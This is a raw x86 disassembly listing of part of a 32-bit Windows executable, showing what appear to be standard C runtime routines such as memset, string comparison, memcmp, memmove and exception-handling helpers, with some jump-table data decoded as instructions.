  4260f5:	lea    eax,[eax*8+0x1]
  4260fc:	push   eax
  4260fd:	push   DWORD PTR [ebp+0x18]
  426100:	call   DWORD PTR ds:0x4280f8
  426106:	mov    edi,eax
  426108:	mov    DWORD PTR [ebp-0x28],edi
  42610b:	test   edi,edi
  42610d:	je     0x4261d1
  426113:	and    DWORD PTR [ebp-0x4],0x0
  426117:	lea    ebx,[edi+edi*1]
  42611a:	mov    eax,ebx
  42611c:	add    eax,0x3
  42611f:	and    eax,0xfffffffc
  426122:	call   0x423990
  426127:	mov    DWORD PTR [ebp-0x18],esp
  42612a:	mov    esi,esp
  42612c:	mov    DWORD PTR [ebp-0x2c],esi
  42612f:	push   ebx
  426130:	push   0x0
  426132:	push   esi
  426133:	call   0x426240
  426138:	add    esp,0xc
  42613b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42613f:	jmp    0x426156
  426141:	xor    eax,eax
  426143:	inc    eax
  426144:	ret    
  426145:	mov    esp,DWORD PTR [ebp-0x18]
  426148:	call   0x426dd5
  42614d:	xor    esi,esi
  42614f:	or     DWORD PTR [ebp-0x4],0xffffffff
  426153:	mov    edi,DWORD PTR [ebp-0x28]
  426156:	test   esi,esi
  426158:	jne    0x426171
  42615a:	push   edi
  42615b:	push   0x2
  42615d:	call   0x424a58
  426162:	pop    ecx
  426163:	pop    ecx
  426164:	mov    esi,eax
  426166:	test   esi,esi
  426168:	je     0x4261d1
  42616a:	mov    DWORD PTR [ebp-0x24],0x1
  426171:	push   edi
  426172:	push   esi
  426173:	push   DWORD PTR [ebp+0x10]
  426176:	push   DWORD PTR [ebp+0xc]
  426179:	push   0x1
  42617b:	push   DWORD PTR [ebp+0x18]
  42617e:	call   DWORD PTR ds:0x4280f8
  426184:	test   eax,eax
  426186:	je     0x426199
  426188:	push   DWORD PTR [ebp+0x14]
  42618b:	push   eax
  42618c:	push   esi
  42618d:	push   DWORD PTR [ebp+0x8]
  426190:	call   DWORD PTR ds:0x428104
  426196:	mov    DWORD PTR [ebp-0x20],eax
  426199:	cmp    DWORD PTR [ebp-0x24],0x0
  42619d:	je     0x4261a6
  42619f:	push   esi
  4261a0:	call   0x42454a
  4261a5:	pop    ecx
  4261a6:	mov    eax,DWORD PTR [ebp-0x20]
  4261a9:	jmp    0x426219
  4261ab:	mov    ebx,DWORD PTR [ebp+0x1c]
  4261ae:	cmp    ebx,esi
  4261b0:	jne    0x4261b8
  4261b2:	mov    ebx,DWORD PTR ds:0x45fe84
  4261b8:	mov    edi,DWORD PTR [ebp+0x18]
  4261bb:	test   edi,edi
  4261bd:	jne    0x4261c5
  4261bf:	mov    edi,DWORD PTR ds:0x45fe94
  4261c5:	push   ebx
  4261c6:	call   0x426bbd
  4261cb:	pop    ecx
  4261cc:	cmp    eax,0xffffffff
  4261cf:	jne    0x4261d5
  4261d1:	xor    eax,eax
  4261d3:	jmp    0x426219
  4261d5:	cmp    eax,edi
  4261d7:	je     0x4261f7
  4261d9:	push   0x0
  4261db:	push   0x0
  4261dd:	lea    ecx,[ebp+0x10]
  4261e0:	push   ecx
  4261e1:	push   DWORD PTR [ebp+0xc]
  4261e4:	push   eax
  4261e5:	push   edi
  4261e6:	call   0x426c06
  4261eb:	add    esp,0x18
  4261ee:	mov    esi,eax
  4261f0:	test   esi,esi
  4261f2:	je     0x4261d1
  4261f4:	mov    DWORD PTR [ebp+0xc],esi
  4261f7:	push   DWORD PTR [ebp+0x14]
  4261fa:	push   DWORD PTR [ebp+0x10]
  4261fd:	push   DWORD PTR [ebp+0xc]
  426200:	push   DWORD PTR [ebp+0x8]
  426203:	push   ebx
  426204:	call   DWORD PTR ds:0x428100
  42620a:	mov    edi,eax
  42620c:	test   esi,esi
  42620e:	je     0x426217
  426210:	push   esi
  426211:	call   0x42454a
  426216:	pop    ecx
  426217:	mov    eax,edi
  426219:	lea    esp,[ebp-0x38]
  42621c:	call   0x42397b
  426221:	ret    
  426222:	mov    eax,ds:0x45fea4
  426227:	test   eax,eax
  426229:	je     0x42623a
  42622b:	push   DWORD PTR [esp+0x4]
  42622f:	call   eax
  426231:	test   eax,eax
  426233:	pop    ecx
  426234:	je     0x42623a
  426236:	xor    eax,eax
  426238:	inc    eax
  426239:	ret    
  42623a:	xor    eax,eax
  42623c:	ret    
  42623d:	int3   
  42623e:	int3   
  42623f:	int3   
  426240:	mov    edx,DWORD PTR [esp+0xc]
  426244:	mov    ecx,DWORD PTR [esp+0x4]
  426248:	test   edx,edx
  42624a:	je     0x42629b
  42624c:	xor    eax,eax
  42624e:	mov    al,BYTE PTR [esp+0x8]
  426252:	push   edi
  426253:	mov    edi,ecx
  426255:	cmp    edx,0x4
  426258:	jb     0x42628b
  42625a:	neg    ecx
  42625c:	and    ecx,0x3
  42625f:	je     0x42626d
  426261:	sub    edx,ecx
  426263:	mov    BYTE PTR [edi],al
  426265:	add    edi,0x1
  426268:	sub    ecx,0x1
  42626b:	jne    0x426263
  42626d:	mov    ecx,eax
  42626f:	shl    eax,0x8
  426272:	add    eax,ecx
  426274:	mov    ecx,eax
  426276:	shl    eax,0x10
  426279:	add    eax,ecx
  42627b:	mov    ecx,edx
  42627d:	and    edx,0x3
  426280:	shr    ecx,0x2
  426283:	je     0x42628b
  426285:	rep stos DWORD PTR es:[edi],eax
  426287:	test   edx,edx
  426289:	je     0x426295
  42628b:	mov    BYTE PTR [edi],al
  42628d:	add    edi,0x1
  426290:	sub    edx,0x1
  426293:	jne    0x42628b
  426295:	mov    eax,DWORD PTR [esp+0x8]
  426299:	pop    edi
  42629a:	ret    
  42629b:	mov    eax,DWORD PTR [esp+0x4]
  42629f:	ret    
  4262a0:	push   esi
  4262a1:	mov    esi,DWORD PTR [esp+0x8]
  4262a5:	test   esi,esi
  4262a7:	je     0x42642e
  4262ad:	push   DWORD PTR [esi+0x4]
  4262b0:	call   0x42454a
  4262b5:	push   DWORD PTR [esi+0x8]
  4262b8:	call   0x42454a
  4262bd:	push   DWORD PTR [esi+0xc]
  4262c0:	call   0x42454a
  4262c5:	push   DWORD PTR [esi+0x10]
  4262c8:	call   0x42454a
  4262cd:	push   DWORD PTR [esi+0x14]
  4262d0:	call   0x42454a
  4262d5:	push   DWORD PTR [esi+0x18]
  4262d8:	call   0x42454a
  4262dd:	push   DWORD PTR [esi]
  4262df:	call   0x42454a
  4262e4:	push   DWORD PTR [esi+0x20]
  4262e7:	call   0x42454a
  4262ec:	push   DWORD PTR [esi+0x24]
  4262ef:	call   0x42454a
  4262f4:	push   DWORD PTR [esi+0x28]
  4262f7:	call   0x42454a
  4262fc:	push   DWORD PTR [esi+0x2c]
  4262ff:	call   0x42454a
  426304:	push   DWORD PTR [esi+0x30]
  426307:	call   0x42454a
  42630c:	push   DWORD PTR [esi+0x34]
  42630f:	call   0x42454a
  426314:	push   DWORD PTR [esi+0x1c]
  426317:	call   0x42454a
  42631c:	push   DWORD PTR [esi+0x38]
  42631f:	call   0x42454a
  426324:	push   DWORD PTR [esi+0x3c]
  426327:	call   0x42454a
  42632c:	add    esp,0x40
  42632f:	push   DWORD PTR [esi+0x40]
  426332:	call   0x42454a
  426337:	push   DWORD PTR [esi+0x44]
  42633a:	call   0x42454a
  42633f:	push   DWORD PTR [esi+0x48]
  426342:	call   0x42454a
  426347:	push   DWORD PTR [esi+0x4c]
  42634a:	call   0x42454a
  42634f:	push   DWORD PTR [esi+0x50]
  426352:	call   0x42454a
  426357:	push   DWORD PTR [esi+0x54]
  42635a:	call   0x42454a
  42635f:	push   DWORD PTR [esi+0x58]
  426362:	call   0x42454a
  426367:	push   DWORD PTR [esi+0x5c]
  42636a:	call   0x42454a
  42636f:	push   DWORD PTR [esi+0x60]
  426372:	call   0x42454a
  426377:	push   DWORD PTR [esi+0x64]
  42637a:	call   0x42454a
  42637f:	push   DWORD PTR [esi+0x68]
  426382:	call   0x42454a
  426387:	push   DWORD PTR [esi+0x6c]
  42638a:	call   0x42454a
  42638f:	push   DWORD PTR [esi+0x70]
  426392:	call   0x42454a
  426397:	push   DWORD PTR [esi+0x74]
  42639a:	call   0x42454a
  42639f:	push   DWORD PTR [esi+0x78]
  4263a2:	call   0x42454a
  4263a7:	push   DWORD PTR [esi+0x7c]
  4263aa:	call   0x42454a
  4263af:	add    esp,0x40
  4263b2:	push   DWORD PTR [esi+0x80]
  4263b8:	call   0x42454a
  4263bd:	push   DWORD PTR [esi+0x84]
  4263c3:	call   0x42454a
  4263c8:	push   DWORD PTR [esi+0x88]
  4263ce:	call   0x42454a
  4263d3:	push   DWORD PTR [esi+0x8c]
  4263d9:	call   0x42454a
  4263de:	push   DWORD PTR [esi+0x90]
  4263e4:	call   0x42454a
  4263e9:	push   DWORD PTR [esi+0x94]
  4263ef:	call   0x42454a
  4263f4:	push   DWORD PTR [esi+0x98]
  4263fa:	call   0x42454a
  4263ff:	push   DWORD PTR [esi+0x9c]
  426405:	call   0x42454a
  42640a:	push   DWORD PTR [esi+0xa0]
  426410:	call   0x42454a
  426415:	push   DWORD PTR [esi+0xa4]
  42641b:	call   0x42454a
  426420:	push   DWORD PTR [esi+0xa8]
  426426:	call   0x42454a
  42642b:	add    esp,0x2c
  42642e:	pop    esi
  42642f:	ret    
  426430:	push   esi
  426431:	mov    esi,DWORD PTR [esp+0x8]
  426435:	test   esi,esi
  426437:	je     0x42648d
  426439:	mov    eax,DWORD PTR [esi]
  42643b:	mov    ecx,DWORD PTR ds:0x45fa14
  426441:	cmp    eax,DWORD PTR [ecx]
  426443:	je     0x426454
  426445:	cmp    eax,DWORD PTR ds:0x45f9e4
  42644b:	je     0x426454
  42644d:	push   eax
  42644e:	call   0x42454a
  426453:	pop    ecx
  426454:	mov    eax,DWORD PTR [esi+0x4]
  426457:	mov    ecx,DWORD PTR ds:0x45fa14
  42645d:	cmp    eax,DWORD PTR [ecx+0x4]
  426460:	je     0x426471
  426462:	cmp    eax,DWORD PTR ds:0x45f9e8
  426468:	je     0x426471
  42646a:	push   eax
  42646b:	call   0x42454a
  426470:	pop    ecx
  426471:	mov    esi,DWORD PTR [esi+0x8]
  426474:	mov    eax,ds:0x45fa14
  426479:	cmp    esi,DWORD PTR [eax+0x8]
  42647c:	je     0x42648d
  42647e:	cmp    esi,DWORD PTR ds:0x45f9ec
  426484:	je     0x42648d
  426486:	push   esi
  426487:	call   0x42454a
  42648c:	pop    ecx
  42648d:	pop    esi
  42648e:	ret    
  42648f:	push   esi
  426490:	mov    esi,DWORD PTR [esp+0x8]
  426494:	test   esi,esi
  426496:	je     0x426566
  42649c:	mov    eax,DWORD PTR [esi+0xc]
  42649f:	mov    ecx,DWORD PTR ds:0x45fa14
  4264a5:	cmp    eax,DWORD PTR [ecx+0xc]
  4264a8:	je     0x4264b9
  4264aa:	cmp    eax,DWORD PTR ds:0x45f9f0
  4264b0:	je     0x4264b9
  4264b2:	push   eax
  4264b3:	call   0x42454a
  4264b8:	pop    ecx
  4264b9:	mov    eax,DWORD PTR [esi+0x10]
  4264bc:	mov    ecx,DWORD PTR ds:0x45fa14
  4264c2:	cmp    eax,DWORD PTR [ecx+0x10]
  4264c5:	je     0x4264d6
  4264c7:	cmp    eax,DWORD PTR ds:0x45f9f4
  4264cd:	je     0x4264d6
  4264cf:	push   eax
  4264d0:	call   0x42454a
  4264d5:	pop    ecx
  4264d6:	mov    eax,DWORD PTR [esi+0x14]
  4264d9:	mov    ecx,DWORD PTR ds:0x45fa14
  4264df:	cmp    eax,DWORD PTR [ecx+0x14]
  4264e2:	je     0x4264f3
  4264e4:	cmp    eax,DWORD PTR ds:0x45f9f8
  4264ea:	je     0x4264f3
  4264ec:	push   eax
  4264ed:	call   0x42454a
  4264f2:	pop    ecx
  4264f3:	mov    eax,DWORD PTR [esi+0x18]
  4264f6:	mov    ecx,DWORD PTR ds:0x45fa14
  4264fc:	cmp    eax,DWORD PTR [ecx+0x18]
  4264ff:	je     0x426510
  426501:	cmp    eax,DWORD PTR ds:0x45f9fc
  426507:	je     0x426510
  426509:	push   eax
  42650a:	call   0x42454a
  42650f:	pop    ecx
  426510:	mov    eax,DWORD PTR [esi+0x1c]
  426513:	mov    ecx,DWORD PTR ds:0x45fa14
  426519:	cmp    eax,DWORD PTR [ecx+0x1c]
  42651c:	je     0x42652d
  42651e:	cmp    eax,DWORD PTR ds:0x45fa00
  426524:	je     0x42652d
  426526:	push   eax
  426527:	call   0x42454a
  42652c:	pop    ecx
  42652d:	mov    eax,DWORD PTR [esi+0x20]
  426530:	mov    ecx,DWORD PTR ds:0x45fa14
  426536:	cmp    eax,DWORD PTR [ecx+0x20]
  426539:	je     0x42654a
  42653b:	cmp    eax,DWORD PTR ds:0x45fa04
  426541:	je     0x42654a
  426543:	push   eax
  426544:	call   0x42454a
  426549:	pop    ecx
  42654a:	mov    esi,DWORD PTR [esi+0x24]
  42654d:	mov    eax,ds:0x45fa14
  426552:	cmp    esi,DWORD PTR [eax+0x24]
  426555:	je     0x426566
  426557:	cmp    esi,DWORD PTR ds:0x45fa08
  42655d:	je     0x426566
  42655f:	push   esi
  426560:	call   0x42454a
  426565:	pop    ecx
  426566:	pop    esi
  426567:	ret    
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	push   ebp
  426571:	mov    ebp,esp
  426573:	push   esi
  426574:	xor    eax,eax
  426576:	push   eax
  426577:	push   eax
  426578:	push   eax
  426579:	push   eax
  42657a:	push   eax
  42657b:	push   eax
  42657c:	push   eax
  42657d:	push   eax
  42657e:	mov    edx,DWORD PTR [ebp+0xc]
  426581:	lea    ecx,[ecx+0x0]
  426584:	mov    al,BYTE PTR [edx]
  426586:	or     al,al
  426588:	je     0x426593
  42658a:	add    edx,0x1
  42658d:	bts    DWORD PTR [esp],eax
  426591:	jmp    0x426584
  426593:	mov    esi,DWORD PTR [ebp+0x8]
  426596:	or     ecx,0xffffffff
  426599:	lea    ecx,[ecx+0x0]
  42659c:	add    ecx,0x1
  42659f:	mov    al,BYTE PTR [esi]
  4265a1:	or     al,al
  4265a3:	je     0x4265ae
  4265a5:	add    esi,0x1
  4265a8:	bt     DWORD PTR [esp],eax
  4265ac:	jae    0x42659c
  4265ae:	mov    eax,ecx
  4265b0:	add    esp,0x20
  4265b3:	pop    esi
  4265b4:	leave  
  4265b5:	ret    
  4265b6:	int3   
  4265b7:	int3   
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    edx,DWORD PTR [esp+0x4]
  4265c4:	mov    ecx,DWORD PTR [esp+0x8]
  4265c8:	test   edx,0x3
  4265ce:	jne    0x42660c
  4265d0:	mov    eax,DWORD PTR [edx]
  4265d2:	cmp    al,BYTE PTR [ecx]
  4265d4:	jne    0x426604
  4265d6:	or     al,al
  4265d8:	je     0x426600
  4265da:	cmp    ah,BYTE PTR [ecx+0x1]
  4265dd:	jne    0x426604
  4265df:	or     ah,ah
  4265e1:	je     0x426600
  4265e3:	shr    eax,0x10
  4265e6:	cmp    al,BYTE PTR [ecx+0x2]
  4265e9:	jne    0x426604
  4265eb:	or     al,al
  4265ed:	je     0x426600
  4265ef:	cmp    ah,BYTE PTR [ecx+0x3]
  4265f2:	jne    0x426604
  4265f4:	add    ecx,0x4
  4265f7:	add    edx,0x4
  4265fa:	or     ah,ah
  4265fc:	jne    0x4265d0
  4265fe:	mov    edi,edi
  426600:	xor    eax,eax
  426602:	ret    
  426603:	nop
  426604:	sbb    eax,eax
  426606:	shl    eax,1
  426608:	add    eax,0x1
  42660b:	ret    
  42660c:	test   edx,0x1
  426612:	je     0x42662c
  426614:	mov    al,BYTE PTR [edx]
  426616:	add    edx,0x1
  426619:	cmp    al,BYTE PTR [ecx]
  42661b:	jne    0x426604
  42661d:	add    ecx,0x1
  426620:	or     al,al
  426622:	je     0x426600
  426624:	test   edx,0x2
  42662a:	je     0x4265d0
  42662c:	mov    ax,WORD PTR [edx]
  42662f:	add    edx,0x2
  426632:	cmp    al,BYTE PTR [ecx]
  426634:	jne    0x426604
  426636:	or     al,al
  426638:	je     0x426600
  42663a:	cmp    ah,BYTE PTR [ecx+0x1]
  42663d:	jne    0x426604
  42663f:	or     ah,ah
  426641:	je     0x426600
  426643:	add    ecx,0x2
  426646:	jmp    0x4265d0
  426648:	int3   
  426649:	int3   
  42664a:	int3   
  42664b:	int3   
  42664c:	int3   
  42664d:	int3   
  42664e:	int3   
  42664f:	int3   
  426650:	mov    eax,DWORD PTR [esp+0xc]
  426654:	test   eax,eax
  426656:	je     0x4266a2
  426658:	mov    edx,DWORD PTR [esp+0x4]
  42665c:	push   esi
  42665d:	push   edi
  42665e:	mov    esi,edx
  426660:	mov    edi,DWORD PTR [esp+0x10]
  426664:	or     edx,edi
  426666:	and    edx,0x3
  426669:	je     0x4266a3
  42666b:	test   eax,0x1
  426670:	je     0x426683
  426672:	mov    cl,BYTE PTR [esi]
  426674:	cmp    cl,BYTE PTR [edi]
  426676:	jne    0x4266d0
  426678:	add    esi,0x1
  42667b:	add    edi,0x1
  42667e:	sub    eax,0x1
  426681:	je     0x4266a0
  426683:	mov    cl,BYTE PTR [esi]
  426685:	mov    dl,BYTE PTR [edi]
  426687:	cmp    cl,dl
  426689:	jne    0x4266d0
  42668b:	mov    cl,BYTE PTR [esi+0x1]
  42668e:	mov    dl,BYTE PTR [edi+0x1]
  426691:	cmp    cl,dl
  426693:	jne    0x4266d0
  426695:	add    edi,0x2
  426698:	add    esi,0x2
  42669b:	sub    eax,0x2
  42669e:	jne    0x426683
  4266a0:	pop    edi
  4266a1:	pop    esi
  4266a2:	ret    
  4266a3:	mov    ecx,eax
  4266a5:	and    eax,0x3
  4266a8:	shr    ecx,0x2
  4266ab:	je     0x4266d8
  4266ad:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266af:	je     0x4266d8
  4266b1:	mov    ecx,DWORD PTR [esi-0x4]
  4266b4:	mov    edx,DWORD PTR [edi-0x4]
  4266b7:	cmp    cl,dl
  4266b9:	jne    0x4266cb
  4266bb:	cmp    ch,dh
  4266bd:	jne    0x4266cb
  4266bf:	shr    ecx,0x10
  4266c2:	shr    edx,0x10
  4266c5:	cmp    cl,dl
  4266c7:	jne    0x4266cb
  4266c9:	cmp    ch,dh
  4266cb:	mov    eax,0x0
  4266d0:	sbb    eax,eax
  4266d2:	pop    edi
  4266d3:	sbb    eax,0xffffffff
  4266d6:	pop    esi
  4266d7:	ret    
  4266d8:	test   eax,eax
  4266da:	je     0x4266a0
  4266dc:	mov    edx,DWORD PTR [esi]
  4266de:	mov    ecx,DWORD PTR [edi]
  4266e0:	cmp    dl,cl
  4266e2:	jne    0x4266cb
  4266e4:	sub    eax,0x1
  4266e7:	je     0x426705
  4266e9:	cmp    dh,ch
  4266eb:	jne    0x4266cb
  4266ed:	sub    eax,0x1
  4266f0:	je     0x426705
  4266f2:	and    ecx,0xff0000
  4266f8:	and    edx,0xff0000
  4266fe:	cmp    edx,ecx
  426700:	jne    0x4266cb
  426702:	sub    eax,0x1
  426705:	pop    edi
  426706:	pop    esi
  426707:	ret    
  426708:	int3   
  426709:	int3   
  42670a:	int3   
  42670b:	int3   
  42670c:	int3   
  42670d:	int3   
  42670e:	int3   
  42670f:	int3   
  426710:	push   ebp
  426711:	mov    ebp,esp
  426713:	push   edi
  426714:	push   esi
  426715:	push   ebx
  426716:	mov    ecx,DWORD PTR [ebp+0x10]
  426719:	jecxz  0x426742
  42671b:	mov    ebx,ecx
  42671d:	mov    edi,DWORD PTR [ebp+0x8]
  426720:	mov    esi,edi
  426722:	xor    eax,eax
  426724:	repnz scas al,BYTE PTR es:[edi]
  426726:	neg    ecx
  426728:	add    ecx,ebx
  42672a:	mov    edi,esi
  42672c:	mov    esi,DWORD PTR [ebp+0xc]
  42672f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426731:	mov    al,BYTE PTR [esi-0x1]
  426734:	xor    ecx,ecx
  426736:	cmp    al,BYTE PTR [edi-0x1]
  426739:	ja     0x426740
  42673b:	je     0x426742
  42673d:	sub    ecx,0x2
  426740:	not    ecx
  426742:	mov    eax,ecx
  426744:	pop    ebx
  426745:	pop    esi
  426746:	pop    edi
  426747:	leave  
  426748:	ret    
  426749:	int3   
  42674a:	int3   
  42674b:	int3   
  42674c:	int3   
  42674d:	int3   
  42674e:	int3   
  42674f:	int3   
  426750:	push   ebp
  426751:	mov    ebp,esp
  426753:	push   esi
  426754:	xor    eax,eax
  426756:	push   eax
  426757:	push   eax
  426758:	push   eax
  426759:	push   eax
  42675a:	push   eax
  42675b:	push   eax
  42675c:	push   eax
  42675d:	push   eax
  42675e:	mov    edx,DWORD PTR [ebp+0xc]
  426761:	lea    ecx,[ecx+0x0]
  426764:	mov    al,BYTE PTR [edx]
  426766:	or     al,al
  426768:	je     0x426773
  42676a:	add    edx,0x1
  42676d:	bts    DWORD PTR [esp],eax
  426771:	jmp    0x426764
  426773:	mov    esi,DWORD PTR [ebp+0x8]
  426776:	mov    edi,edi
  426778:	mov    al,BYTE PTR [esi]
  42677a:	or     al,al
  42677c:	je     0x42678a
  42677e:	add    esi,0x1
  426781:	bt     DWORD PTR [esp],eax
  426785:	jae    0x426778
  426787:	lea    eax,[esi-0x1]
  42678a:	add    esp,0x20
  42678d:	pop    esi
  42678e:	leave  
  42678f:	ret    
  426790:	push   ebp
  426791:	mov    ebp,esp
  426793:	push   ebx
  426794:	push   esi
  426795:	push   edi
  426796:	push   ebp
  426797:	push   0x0
  426799:	push   0x0
  42679b:	push   0x4267a8
  4267a0:	push   DWORD PTR [ebp+0x8]
  4267a3:	call   0x42721e
  4267a8:	pop    ebp
  4267a9:	pop    edi
  4267aa:	pop    esi
  4267ab:	pop    ebx
  4267ac:	mov    esp,ebp
  4267ae:	pop    ebp
  4267af:	ret    
  4267b0:	mov    ecx,DWORD PTR [esp+0x4]
  4267b4:	test   DWORD PTR [ecx+0x4],0x6
  4267bb:	mov    eax,0x1
  4267c0:	je     0x4267d1
  4267c2:	mov    eax,DWORD PTR [esp+0x8]
  4267c6:	mov    edx,DWORD PTR [esp+0x10]
  4267ca:	mov    DWORD PTR [edx],eax
  4267cc:	mov    eax,0x3
  4267d1:	ret    
  4267d2:	push   ebx
  4267d3:	push   esi
  4267d4:	push   edi
  4267d5:	mov    eax,DWORD PTR [esp+0x10]
  4267d9:	push   eax
  4267da:	push   0xfffffffe
  4267dc:	push   0x4267b0
  4267e1:	push   DWORD PTR fs:0x0
  4267e8:	mov    DWORD PTR fs:0x0,esp
  4267ef:	mov    eax,DWORD PTR [esp+0x20]
  4267f3:	mov    ebx,DWORD PTR [eax+0x8]
  4267f6:	mov    esi,DWORD PTR [eax+0xc]
  4267f9:	cmp    esi,0xffffffff
  4267fc:	je     0x42682c
  4267fe:	cmp    esi,DWORD PTR [esp+0x24]
  426802:	je     0x42682c
  426804:	lea    esi,[esi+esi*2]
  426807:	mov    ecx,DWORD PTR [ebx+esi*4]
  42680a:	mov    DWORD PTR [esp+0x8],ecx
  42680e:	mov    DWORD PTR [eax+0xc],ecx
  426811:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426816:	jne    0x42682a
  426818:	push   0x101
  42681d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426821:	call   0x426866
  426826:	call   DWORD PTR [ebx+esi*4+0x8]
  42682a:	jmp    0x4267ef
  42682c:	pop    DWORD PTR fs:0x0
  426833:	add    esp,0xc
  426836:	pop    edi
  426837:	pop    esi
  426838:	pop    ebx
  426839:	ret    
  42683a:	xor    eax,eax
  42683c:	mov    ecx,DWORD PTR fs:0x0
  426843:	cmp    DWORD PTR [ecx+0x4],0x4267b0
  42684a:	jne    0x42685c
  42684c:	mov    edx,DWORD PTR [ecx+0xc]
  42684f:	mov    edx,DWORD PTR [edx+0xc]
  426852:	cmp    DWORD PTR [ecx+0x8],edx
  426855:	jne    0x42685c
  426857:	mov    eax,0x1
  42685c:	ret    
  42685d:	push   ebx
  42685e:	push   ecx
  42685f:	mov    ebx,0x45fa2c
  426864:	jmp    0x426870
  426866:	push   ebx
  426867:	push   ecx
  426868:	mov    ebx,0x45fa2c
  42686d:	mov    ecx,DWORD PTR [ebp+0x8]
  426870:	mov    DWORD PTR [ebx+0x8],ecx
  426873:	mov    DWORD PTR [ebx+0x4],eax
  426876:	mov    DWORD PTR [ebx+0xc],ebp
  426879:	pop    ecx
  42687a:	pop    ebx
  42687b:	ret    0x4
  42687e:	int3   
  42687f:	int3   
  426880:	push   ebp
  426881:	mov    ebp,esp
  426883:	push   edi
  426884:	push   esi
  426885:	mov    esi,DWORD PTR [ebp+0xc]
  426888:	mov    ecx,DWORD PTR [ebp+0x10]
  42688b:	mov    edi,DWORD PTR [ebp+0x8]
  42688e:	mov    eax,ecx
  426890:	mov    edx,ecx
  426892:	add    eax,esi
  426894:	cmp    edi,esi
  426896:	jbe    0x4268a0
  426898:	cmp    edi,eax
  42689a:	jb     0x426a1c
  4268a0:	test   edi,0x3
  4268a6:	jne    0x4268bc
  4268a8:	shr    ecx,0x2
  4268ab:	and    edx,0x3
  4268ae:	cmp    ecx,0x8
  4268b1:	jb     0x4268dc
  4268b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268b5:	jmp    DWORD PTR [edx*4+0x4269cc]
  4268bc:	mov    eax,edi
  4268be:	mov    edx,0x3
  4268c3:	sub    ecx,0x4
  4268c6:	jb     0x4268d4
  4268c8:	and    eax,0x3
  4268cb:	add    ecx,eax
  4268cd:	jmp    DWORD PTR [eax*4+0x4268e0]
  4268d4:	jmp    DWORD PTR [ecx*4+0x4269dc]
  4268db:	nop
  4268dc:	jmp    DWORD PTR [ecx*4+0x426960]
  4268e3:	nop
  4268e4:	lock push 0x691c0042
  4268ea:	inc    edx
  4268eb:	add    BYTE PTR [eax+0x69],al
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx],ah
  4268f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4268f7:	inc    esi
  4268f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4268fe:	add    al,cl
  426900:	jmp    0x289f107
  426905:	add    esi,0x3
  426908:	add    edi,0x3
  42690b:	cmp    ecx,0x8
  42690e:	jb     0x4268dc
  426910:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426912:	jmp    DWORD PTR [edx*4+0x4269cc]
  426919:	lea    ecx,[ecx+0x0]
  42691c:	and    edx,ecx
  42691e:	mov    al,BYTE PTR [esi]
  426920:	mov    BYTE PTR [edi],al
  426922:	mov    al,BYTE PTR [esi+0x1]
  426925:	shr    ecx,0x2
  426928:	mov    BYTE PTR [edi+0x1],al
  42692b:	add    esi,0x2
  42692e:	add    edi,0x2
  426931:	cmp    ecx,0x8
  426934:	jb     0x4268dc
  426936:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426938:	jmp    DWORD PTR [edx*4+0x4269cc]
  42693f:	nop
  426940:	and    edx,ecx
  426942:	mov    al,BYTE PTR [esi]
  426944:	mov    BYTE PTR [edi],al
  426946:	add    esi,0x1
  426949:	shr    ecx,0x2
  42694c:	add    edi,0x1
  42694f:	cmp    ecx,0x8
  426952:	jb     0x4268dc
  426954:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426956:	jmp    DWORD PTR [edx*4+0x4269cc]
  42695d:	lea    ecx,[ecx+0x0]
  426960:	ret    
  426961:	imul   eax,DWORD PTR [edx+0x0],0x4269b0
  426968:	test   al,0x69
  42696a:	inc    edx
  42696b:	add    BYTE PTR [eax-0x67ffbd97],ah
  426971:	imul   eax,DWORD PTR [edx+0x0],0x426990
  426978:	mov    BYTE PTR [ecx+0x42],ch
  42697b:	add    BYTE PTR [eax-0x74ffbd97],al
  426981:	inc    esp
  426982:	mov    fs,esp
  426984:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426988:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42698c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426990:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426994:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426998:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42699c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4269a0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4269a4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4269a8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4269ac:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4269b0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4269b4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4269b8:	lea    eax,[ecx*4+0x0]
  4269bf:	add    esi,eax
  4269c1:	add    edi,eax
  4269c3:	jmp    DWORD PTR [edx*4+0x4269cc]
  4269ca:	mov    edi,edi
  4269cc:	fsubr  QWORD PTR [ecx+0x42]
  4269cf:	add    ah,ah
  4269d1:	imul   eax,DWORD PTR [edx+0x0],0x4269f0
  4269d8:	add    al,0x6a
  4269da:	inc    edx
  4269db:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4269e1:	leave  
  4269e2:	ret    
  4269e3:	nop
  4269e4:	mov    al,BYTE PTR [esi]
  4269e6:	mov    BYTE PTR [edi],al
  4269e8:	mov    eax,DWORD PTR [ebp+0x8]
  4269eb:	pop    esi
  4269ec:	pop    edi
  4269ed:	leave  
  4269ee:	ret    
  4269ef:	nop
  4269f0:	mov    al,BYTE PTR [esi]
  4269f2:	mov    BYTE PTR [edi],al
